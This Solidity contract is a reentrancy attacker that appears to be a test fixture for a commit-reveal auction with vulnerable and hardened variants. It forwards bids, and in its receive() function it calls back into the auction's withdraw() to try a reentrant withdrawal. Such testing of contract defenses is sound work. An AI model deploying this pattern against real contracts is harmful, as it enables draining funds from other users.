// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "src/utils/ApproveHelper.sol";

/// @title MaliciousReentrant
/// @notice Forwards commits/reveals so the contract is recorded as a bidder, and attempts a reentrant call
/// in `receive()` by calling `withdraw(targetAuctionId)` on a configured auction address.

contract MaliciousReentrant is ApproveHelper {
    address public targetAuction;
    uint256 public targetAuctionId;
    bool public attacked;

    constructor() {
        attacked = false;
    }

    /// @notice Set the auction this contract will attempt to reenter during receive().
    /// Controller EOA should call this after deployment.
    function setTarget(address _auction, uint256 _auctionId) external {
        targetAuction = _auction;
        targetAuctionId = _auctionId;
    }

    /// @notice When this contract receives ETH (or is the recipient of a token push that triggers fallback),
    /// it will attempt a single reentrant call into the configured auction.withdraw(auctionId).
    receive() external payable {
        if (!attacked && targetAuction != address(0)) {
            attacked = true;
            // attempt to reenter withdraw; ignore returned data
            (bool ok, ) = targetAuction.call(abi.encodeWithSignature("withdraw(uint256)", targetAuctionId));
            ok; // intentionally ignore success/failure
        }
    }

    // -------------------------
    // Forwarding helpers (controller EOA calls these)
    // -------------------------
    function forwardCommitVulnerable(address auction, uint256 auctionId, bytes32 commitHash, uint256 depositAmount) external {
        (bool ok, ) = auction.call(abi.encodeWithSignature("commit(uint256,bytes32,uint256)", auctionId, commitHash, depositAmount));
        require(ok, "forwardCommitVulnerable failed");
    }

    function forwardCommitHardened(address auction, uint256 auctionId, bytes32 commitHash) external {
        (bool ok, ) = auction.call(abi.encodeWithSignature("commit(uint256,bytes32)", auctionId, commitHash));
        require(ok, "forwardCommitHardened failed");
    }

    function forwardReveal(address auction, uint256 auctionId, uint256 bidAmount, bytes32 salt) external {
        (bool ok, ) = auction.call(abi.encodeWithSignature("reveal(uint256,uint256,bytes32)", auctionId, bidAmount, salt));
        require(ok, "forwardReveal failed");
    }

    function proxyWithdraw(address auction, uint256 auctionId) external {
        (bool ok, ) = auction.call(abi.encodeWithSignature("withdraw(uint256)", auctionId));
        require(ok, "proxyWithdraw failed");
    }
}
